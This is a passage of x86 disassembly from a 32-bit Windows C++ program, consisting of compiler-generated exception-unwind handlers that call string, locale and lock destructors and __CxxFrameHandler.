jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_42ff64
lea ecx [ ebp - 0x28 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_42ff6d
mov eax r--data
jmp __CxxFrameHandler
sub_42ff80
lea ecx [ ebp + 0xc ]
jmp sub_403170
sub_42ff88
mov eax r--data
jmp __CxxFrameHandler
sub_42ffa0
mov ecx [ ebp - 0x10 ]
add ecx 0xc
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_42ffac
mov eax r--data
jmp __CxxFrameHandler
sub_42ffc0
mov ecx [ ebp - 0x10 ]
add ecx 0xc
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_42ffcc
mov eax r--data
jmp __CxxFrameHandler
sub_42ffe0
mov ecx [ ebp - 0x10 ]
jmp sub_403f10
sub_42ffe8
mov eax r--data
jmp __CxxFrameHandler
sub_430000
mov ecx [ ebp - 0x10 ]
jmp sub_403f10
sub_430008
mov eax r--data
jmp __CxxFrameHandler
sub_430020
mov ecx [ ebp - 0x10 ]
jmp sub_40b010
sub_430028
mov eax r--data
jmp __CxxFrameHandler
sub_430040
mov ecx [ ebp - 0x10 ]
jmp sub_40a860
sub_430048
mov eax r--data
jmp __CxxFrameHandler
sub_430060
lea ecx [ ebp - 0x10 ]
jmp sub_403170
sub_430068
mov eax r--data
jmp __CxxFrameHandler
sub_430080
mov ecx [ ebp - 0x10 ]
jmp sub_40a860
sub_430088
mov eax r--data
jmp __CxxFrameHandler
sub_4300a0
lea ecx [ ebp - 0x50 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_4300a9
lea ecx [ ebp - 0x34 ]
jmp sub_403f10
sub_4300b1
mov eax r--data
jmp __CxxFrameHandler
sub_4300c0
mov eax [ ebp + 0x4 ]
push eax
mov ecx [ ebp - 0x10 ]
push ecx
call sub_408de0
add esp 0x8
retn
sub_4300d1
mov eax r--data
jmp __CxxFrameHandler
sub_4300e0
mov ecx [ ebp - 0x10 ]
jmp sub_40b010
sub_4300e8
mov eax r--data
jmp __CxxFrameHandler
sub_430100
lea ecx [ ebp + 0x8 ]
jmp sub_40b010
sub_430108
lea ecx [ ebp + 0x8 ]
jmp sub_40b070
sub_430110
lea ecx [ ebp + 0x8 ]
jmp sub_40b010
sub_430118
mov eax r--data
jmp __CxxFrameHandler
sub_430130
mov eax [ ebp - 0x14 ]
push eax
mov ecx [ ebp - 0x18 ]
push ecx
call sub_408de0
add esp 0x8
retn
sub_430141
mov eax r--data
jmp __CxxFrameHandler
sub_430150
lea ecx [ ebp + 0x8 ]
jmp sub_40b010
sub_430158
lea ecx [ ebp + 0x8 ]
jmp sub_40b070
sub_430160
lea ecx [ ebp + 0x8 ]
jmp sub_40b010
sub_430168
mov eax r--data
jmp __CxxFrameHandler
sub_430180
lea ecx [ ebp - 0x50 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_430189
mov eax r--data
jmp __CxxFrameHandler
sub_4301a0
mov eax r--data
jmp __CxxFrameHandler
sub_4301b0
mov eax r--data
jmp __CxxFrameHandler
sub_4301c0
lea ecx [ ebp - 0x50 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_4301c9
mov ecx [ ebp - 0x54 ]
add ecx 0xc
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_4301d5
mov eax r--data
jmp __CxxFrameHandler
sub_4301e0
mov ecx [ ebp - 0x10 ]
jmp sub_403f10
sub_4301e8
mov eax r--data
jmp __CxxFrameHandler
sub_430200
lea ecx [ ebp - 0x14 ]
jmp sub_40a860
sub_430208
lea ecx [ ebp - 0x14 ]
jmp sub_40b0b0
sub_430210
lea ecx [ ebp - 0x14 ]
jmp sub_40a860
sub_430218
lea ecx [ ebp - 0x10 ]
jmp sub_40b010
sub_430220
lea ecx [ ebp - 0x10 ]
jmp sub_40b070
sub_430228
lea ecx [ ebp - 0x10 ]
jmp sub_40b010
sub_430230
lea ecx [ ebp - 0x14 ]
jmp sub_40a860
sub_430238
mov eax r--data
jmp __CxxFrameHandler
sub_430250
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
lea ecx [ ebp - 0x38 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_43026a
lea ecx [ ebp - 0x38 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_430273
mov eax r--data
jmp __CxxFrameHandler
sub_430280
lea ecx [ ebp - 0x14 ]
jmp sub_40b290
sub_430288
lea ecx [ ebp - 0x10 ]
jmp sub_40a860
sub_430290
lea ecx [ ebp - 0x10 ]
jmp sub_40b0b0
sub_430298
mov eax r--data
jmp __CxxFrameHandler
sub_4302b0
mov eax r--data
jmp __CxxFrameHandler
sub_4302c0
mov ecx [ ebp - 0x10 ]
jmp sub_40ce70
sub_4302c8
mov eax r--data
jmp __CxxFrameHandler
sub_4302e0
mov ecx [ ebp - 0x10 ]
jmp sub_4190f0
sub_4302e8
mov ecx [ ebp - 0x10 ]
add ecx 0x88
jmp sub_40b1a0
sub_4302f6
mov ecx [ ebp - 0x10 ]
add ecx 0xa0
jmp sub_40cf90
sub_430304
mov ecx [ ebp - 0x10 ]
add ecx 0xac
jmp sub_40cf90
sub_430312
mov ecx [ ebp - 0x10 ]
add ecx 0xb8
jmp sub_408660
sub_430320
mov eax r--data
jmp __CxxFrameHandler
sub_430330
lea ecx [ ebp - 0x10 ]
jmp sub_406390
sub_430338
lea ecx [ ebp - 0x10 ]
jmp sub_4063b0
sub_430340
lea ecx [ ebp - 0x10 ]
jmp sub_406390
sub_430348
lea ecx [ ebp - 0x10 ]
jmp sub_406390
sub_430350
mov eax r--data
jmp __CxxFrameHandler
sub_430360
mov ecx [ ebp - 0x10 ]
jmp sub_40ce70
sub_430368
mov eax r--data
jmp __CxxFrameHandler
sub_430380
lea ecx [ ebp - 0x1c ]
jmp sub_40a6f0
sub_430388
mov eax r--data
jmp __CxxFrameHandler
sub_4303a0
mov ecx [ ebp - 0x10 ]
jmp sub_4190f0
sub_4303a8
mov ecx [ ebp - 0x10 ]
add ecx 0x88
jmp sub_40b1a0
sub_4303b6
mov ecx [ ebp - 0x10 ]
add ecx 0xa0
jmp sub_40cf90
sub_4303c4
mov ecx [ ebp - 0x10 ]
add ecx 0xac
jmp sub_40cf90
sub_4303d2
mov ecx [ ebp - 0x10 ]
add ecx 0xb8
jmp sub_408660
sub_4303e0
mov eax r--data
jmp __CxxFrameHandler
sub_4303f0
lea ecx [ ebp - 0x24 ]
jmp sub_40cea0
sub_4303f8
lea ecx [ ebp - 0x40 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_430401
lea ecx [ ebp - 0x40 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_43040a
mov eax r--data
jmp __CxxFrameHandler
sub_430420
lea ecx [ ebp - 0x54 ]
jmp sub_407620
sub_430428
mov eax r--data
jmp __CxxFrameHandler
sub_430440
mov eax [ rw-data ]
and eax 0xfffffffe
mov [ rw-data ] eax
retn
sub_43044e
mov eax r--data
jmp __CxxFrameHandler
sub_430460
mov ecx [ ebp - 0x10 ]
jmp sub_418460
sub_430468
mov ecx [ ebp - 0x10 ]
add ecx 0x14
jmp sub_40cff0
sub_430473
mov eax r--data
jmp __CxxFrameHandler
sub_430480
mov ecx [ ebp - 0x10 ]
jmp sub_418460
sub_430488
mov ecx [ ebp - 0x10 ]
add ecx 0x14
jmp sub_40cff0
sub_430493
mov eax r--data
jmp __CxxFrameHandler
sub_4304a0
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_40de90
sub_4304ab
mov ecx [ ebp - 0x10 ]
add ecx 0x10
jmp sub_40dec0
sub_4304b6
mov eax r--data
jmp __CxxFrameHandler
sub_4304c0
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_40de90
sub_4304cb
mov ecx [ ebp - 0x10 ]
add ecx 0x10
jmp sub_40dec0
sub_4304d6
mov eax r--data
jmp __CxxFrameHandler
sub_4304e0
lea ecx [ ebp - 0x40 ]
jmp sub_40de90
sub_4304e8
lea ecx [ ebp - 0x34 ]
jmp sub_40dec0
sub_4304f0
lea ecx [ ebp - 0x44 ]
jmp sub_40e080
sub_4304f8
mov eax r--data
jmp __CxxFrameHandler
sub_430510
mov ecx [ ebp - 0x10 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_430519
mov eax r--data
jmp __CxxFrameHandler
sub_430530
mov ecx [ ebp - 0x10 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_430539
mov eax r--data
jmp __CxxFrameHandler
sub_430550
lea ecx [ ebp - 0x2c ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_430559
mov eax [ ebp - 0x30 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x30 ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_430573
mov eax r--data
jmp __CxxFrameHandler
sub_430580
lea ecx [ ebp - 0x28 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_430589
lea ecx [ ebp - 0x28 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_430592
mov eax r--data
jmp __CxxFrameHandler
sub_4305a0
mov eax [ rw-data ]
and eax 0xfffffffe
mov [ rw-data ] eax
retn
__imp_??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAE@XZ
mov ecx rw-data
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_4305b9
mov eax r--data
jmp __CxxFrameHandler
sub_4305d0
lea ecx [ ebp - 0x10 ]
jmp sub_40eab0
sub_4305d8
mov eax r--data
jmp __CxxFrameHandler
sub_4305f0
mov eax [ ebp - 0x14 ]
push eax
mov ecx [ ebp - 0x18 ]
push ecx
call sub_408de0
add esp 0x8
retn
sub_430601
mov eax r--data
jmp __CxxFrameHandler
sub_430610
lea ecx [ ebp - 0x50 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_430619
mov eax r--data
jmp __CxxFrameHandler
sub_430630
mov eax r--data
jmp __CxxFrameHandler
sub_430640
mov ecx [ ebp - 0x10 ]
jmp sub_40ef20
sub_430648
mov ecx [ ebp - 0x10 ]
add ecx 0xc
jmp sub_401720
sub_430653
mov eax r--data
jmp __CxxFrameHandler
sub_430660
mov ecx [ ebp - 0x10 ]
jmp sub_40ef20
sub_430668
mov ecx [ ebp - 0x10 ]
add ecx 0xc
jmp sub_401720
sub_430673
mov eax r--data
jmp __CxxFrameHandler
sub_430680
lea ecx [ ebp - 0x10 ]
jmp sub_40eab0
sub_430688
mov eax r--data
jmp __CxxFrameHandler
sub_4306a0
lea ecx [ ebp - 0x20 ]
jmp sub_40eab0
sub_4306a8
mov eax r--data
jmp __CxxFrameHandler
sub_4306c0
mov ecx [ ebp - 0x10 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_4306c9
mov eax r--data
jmp __CxxFrameHandler
sub_4306e0
mov ecx [ ebp - 0x10 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_4306e9
mov eax r--data
jmp __CxxFrameHandler
sub_430700
mov eax [ ebp + 0x4 ]
push eax
call ??3@YAXPAX@Z
pop ecx
retn
sub_43070b
mov eax r--data
jmp __CxxFrameHandler
sub_430720
mov eax [ ebp + 0x4 ]
push eax
call ??3@YAXPAX@Z
pop ecx
retn
sub_43072b
mov eax r--data
jmp __CxxFrameHandler
sub_430740
mov ecx [ ebp - 0x10 ]
jmp sub_40f470
sub_430748
mov ecx [ ebp - 0x10 ]
add ecx 0x8
jmp sub_40f560
sub_430753
mov ecx [ ebp - 0x10 ]
add ecx 0x10
jmp sub_4014a0
sub_43075e
mov ecx [ ebp - 0x10 ]
add ecx 0x2c
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_43076a
mov eax r--data
jmp __CxxFrameHandler
sub_430780
mov ecx [ ebp - 0x10 ]
jmp sub_40f470
sub_430788
mov ecx [ ebp - 0x10 ]
add ecx 0x8
jmp sub_40f560
sub_430793
mov ecx [ ebp - 0x10 ]
add ecx 0x10
jmp sub_4014a0
sub_43079e
mov ecx [ ebp - 0x10 ]
add ecx 0x2c
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_4307aa
mov eax r--data
jmp __CxxFrameHandler
sub_4307c0
mov eax [ ebp + 0x18 ]
push eax
call ??3@YAXPAX@Z
pop ecx
retn
sub_4307cb
mov eax [ ebp + 0x18 ]
push eax
call ??3@YAXPAX@Z
pop ecx
retn
sub_4307d6
mov eax r--data
jmp __CxxFrameHandler
sub_4307e0
lea ecx [ ebp - 0x94 ]
jmp sub_401db0
sub_4307eb
lea ecx [ ebp - 0xb0 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_4307f7
mov eax r--data
jmp __CxxFrameHandler
sub_430810
mov eax [ rw-data ]
and eax 0xfffffffe
mov [ rw-data ] eax
retn
sub_43081e
mov eax r--data
jmp __CxxFrameHandler
sub_430830
lea ecx [ ebp - 0x28 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_430839
mov eax r--data
jmp __CxxFrameHandler
sub_430850
lea ecx [ ebp - 0x1c ]
jmp [ std::_Lockit::~_Lockit@IAT ]
sub_430859
mov eax r--data
jmp __CxxFrameHandler
sub_430870
lea ecx [ ebp - 0x1c ]
jmp [ std::_Lockit::~_Lockit@IAT ]
sub_430879
mov eax r--data
jmp __CxxFrameHandler
sub_430890
lea ecx [ ebp - 0x28 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_430899
mov eax [ ebp - 0x2c ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x2c ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_4308b3
mov eax r--data
jmp __CxxFrameHandler
sub_4308c0
lea ecx [ ebp - 0x28 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_4308c9
mov eax [ ebp - 0x2c ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x2c ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_4308e3
mov eax r--data
jmp __CxxFrameHandler
sub_4308f0
lea ecx [ ebp - 0x28 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_4308f9
mov eax [ ebp - 0x2c ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x2c ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_430913
mov eax r--data
jmp __CxxFrameHandler
sub_430920
lea ecx [ ebp - 0x28 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_430929
mov eax [ ebp - 0x2c ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x2c ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_430943
mov eax r--data
jmp __CxxFrameHandler
sub_430950
lea ecx [ ebp - 0x28 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_430959
mov eax [ ebp - 0x2c ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x2c ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_430973
mov eax r--data
jmp __CxxFrameHandler
sub_430980
lea ecx [ ebp - 0x28 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_430989
mov eax [ ebp - 0x2c ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x2c ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_4309a3
mov eax r--data
jmp __CxxFrameHandler
sub_4309b0
lea ecx [ ebp - 0x28 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_4309b9
mov eax [ ebp - 0x2c ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x2c ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_4309d3
mov eax r--data
jmp __CxxFrameHandler
sub_4309e0
lea ecx [ ebp - 0x28 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_4309e9
mov eax [ ebp - 0x2c ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x2c ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_430a03
mov eax r--data
jmp __CxxFrameHandler
sub_430a10
mov ecx [ ebp - 0x10 ]
jmp sub_40ff50
sub_430a18
mov eax r--data
jmp __CxxFrameHandler
sub_430a30
mov ecx [ ebp - 0x10 ]
jmp sub_40ff90
sub_430a38
mov eax r--data
jmp __CxxFrameHandler
sub_430a50
mov ecx [ ebp - 0x10 ]
jmp sub_40ff50
sub_430a58
mov eax r--data
jmp __CxxFrameHandler
sub_430a70
mov ecx [ ebp - 0x10 ]
jmp sub_40ff90
sub_430a78
mov eax r--data
jmp __CxxFrameHandler
sub_430a90
mov ecx [ ebp - 0x10 ]
jmp sub_4100a0
sub_430a98
mov eax r--data
jmp __CxxFrameHandler
sub_430ab0
mov ecx [ ebp - 0x10 ]
jmp sub_4100a0
sub_430ab8
mov eax r--data
jmp __CxxFrameHandler
sub_430ad0
mov ecx [ ebp - 0x10 ]
jmp sub_410110
sub_430ad8
mov eax r--data
jmp __CxxFrameHandler
sub_430af0
mov ecx [ ebp - 0x10 ]
jmp sub_410110
sub_430af8
mov eax r--data
jmp __CxxFrameHandler
sub_430b10
lea ecx [ ebp - 0x34 ]
jmp sub_4106e0
sub_430b18
lea ecx [ ebp - 0x20 ]
jmp [ std::locale::~locale@IAT ]
sub_430b21
lea ecx [ ebp - 0x34 ]
jmp sub_40ff50
sub_430b29
mov eax r--data
jmp __CxxFrameHandler
sub_430b40
lea ecx [ ebp - 0x2c ]
jmp sub_4106e0
sub_430b48
lea ecx [ ebp - 0x2c ]
jmp sub_40ff50
sub_430b50
mov eax r--data
jmp __CxxFrameHandler
sub_430b60
lea ecx [ ebp - 0x40 ]
jmp sub_410960
sub_430b68
mov eax r--data
jmp __CxxFrameHandler
sub_430b80
lea ecx [ ebp - 0x34 ]
jmp sub_410740
sub_430b88
lea ecx [ ebp - 0x20 ]
jmp [ std::locale::~locale@IAT ]
sub_430b91
lea ecx [ ebp - 0x34 ]
jmp sub_40ff90
sub_430b99
mov eax r--data
jmp __CxxFrameHandler
sub_430bb0
lea ecx [ ebp - 0x2c ]
jmp sub_410740
sub_430bb8
lea ecx [ ebp - 0x2c ]
jmp sub_40ff90
sub_430bc0
mov eax r--data
jmp __CxxFrameHandler
sub_430bd0
lea ecx [ ebp - 0x40 ]
jmp sub_410aa0
sub_430bd8
mov eax r--data
jmp __CxxFrameHandler
sub_430bf0
lea ecx [ ebp - 0x10 ]
jmp sub_40eab0
sub_430bf8
mov eax r--data
jmp __CxxFrameHandler
sub_430c10
lea ecx [ ebp - 0x10 ]
jmp sub_40eab0
sub_430c18
mov eax r--data
jmp __CxxFrameHandler
sub_430c30
lea ecx [ ebp - 0x50 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_430c39
lea ecx [ ebp - 0x34 ]
jmp sub_403f10
sub_430c41
mov eax r--data
jmp __CxxFrameHandler
sub_430c50
mov ecx [ ebp - 0x10 ]
jmp j_sub_411d60
sub_430c58
mov eax r--data
jmp __CxxFrameHandler
sub_430c70
mov ecx [ ebp - 0x14 ]
add ecx 0xc
jmp sub_401720
sub_430c7b
mov ecx [ ebp - 0x14 ]
add ecx 0x28
jmp sub_411ff0
sub_430c86
mov ecx [ ebp - 0x10 ]
jmp j_sub_411d60
sub_430c8e
mov eax r--data
jmp __CxxFrameHandler
sub_430ca0
mov ecx [ ebp - 0x10 ]
jmp j_sub_411d60
sub_430ca8
mov eax r--data
jmp __CxxFrameHandler
sub_430cc0
mov ecx [ ebp - 0x14 ]
add ecx 0xc
jmp sub_401720
sub_430ccb
mov ecx [ ebp - 0x10 ]
jmp j_sub_411d60
sub_430cd3
mov ecx [ ebp - 0x14 ]
add ecx 0x28
jmp sub_411ff0
sub_430cde
mov eax r--data
jmp __CxxFrameHandler
sub_430cf0
lea ecx [ ebp - 0x18 ]
jmp sub_40eab0
sub_430cf8
mov eax r--data
jmp __CxxFrameHandler
sub_430d10
mov eax [ rw-data ]
and eax 0xfffffffe
mov [ rw-data ] eax
retn
sub_430d1e
mov eax r--data
jmp __CxxFrameHandler
sub_430d30
mov ecx [ ebp - 0x10 ]
jmp sub_412a10
sub_430d38
mov eax r--data
jmp __CxxFrameHandler
sub_430d50
mov ecx [ ebp - 0x10 ]
jmp sub_412a10
sub_430d58
mov eax r--data
jmp __CxxFrameHandler
sub_430d70
mov ecx [ ebp - 0x10 ]
jmp sub_412a10
sub_430d78
mov eax r--data
jmp __CxxFrameHandler
sub_430d90
lea ecx [ ebp - 0x14 ]
jmp sub_412a10
sub_430d98
lea ecx [ ebp - 0x14 ]
jmp sub_412b40
sub_430da0
mov ecx [ ebp + 0x4 ]
jmp sub_412a10
sub_430da8
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp sub_412b40
sub_430dc1
lea ecx [ ebp - 0x14 ]
jmp sub_412a10
sub_430dc9
mov eax r--data
jmp __CxxFrameHandler
sub_430de0
mov eax [ ebp - 0x18 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x18 ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp sub_412b40
sub_430df9
mov eax r--data
jmp __CxxFrameHandler
sub_430e10
mov ecx [ ebp - 0x10 ]
jmp sub_4130a0
sub_430e18
mov eax r--data
jmp __CxxFrameHandler
sub_430e30
mov ecx [ ebp - 0x10 ]
jmp sub_413110
sub_430e38
mov eax r--data
jmp __CxxFrameHandler
sub_430e50
mov ecx [ ebp - 0x10 ]
jmp sub_413020
sub_430e58
mov eax r--data
jmp __CxxFrameHandler
sub_430e70
mov ecx [ ebp - 0x10 ]
jmp sub_413020
sub_430e78
mov eax r--data
jmp __CxxFrameHandler
sub_430e90
mov ecx [ ebp - 0x10 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_430e99
mov ecx [ ebp - 0x10 ]
add ecx 0x1c
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_430ea5
mov eax r--data
jmp __CxxFrameHandler
sub_430eb0
mov ecx [ ebp - 0x10 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_430eb9
mov ecx [ ebp - 0x10 ]
add ecx 0x1c
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_430ec5
mov eax r--data
jmp __CxxFrameHandler
sub_430ed0
mov ecx [ ebp - 0x10 ]
jmp sub_413190
sub_430ed8
mov ecx [ ebp - 0x10 ]
jmp sub_413110
sub_430ee0
mov eax r--data
jmp __CxxFrameHandler
sub_430ef0
mov ecx [ ebp - 0x10 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_430ef9
mov ecx [ ebp - 0x10 ]
add ecx 0x1c
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_430f05
mov eax r--data
jmp __CxxFrameHandler
sub_430f10
mov ecx [ ebp - 0x10 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_430f19
mov ecx [ ebp - 0x10 ]
add ecx 0x1c
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_430f25
mov eax r--data
jmp __CxxFrameHandler
sub_430f30
lea ecx [ ebp - 0x10034 ]
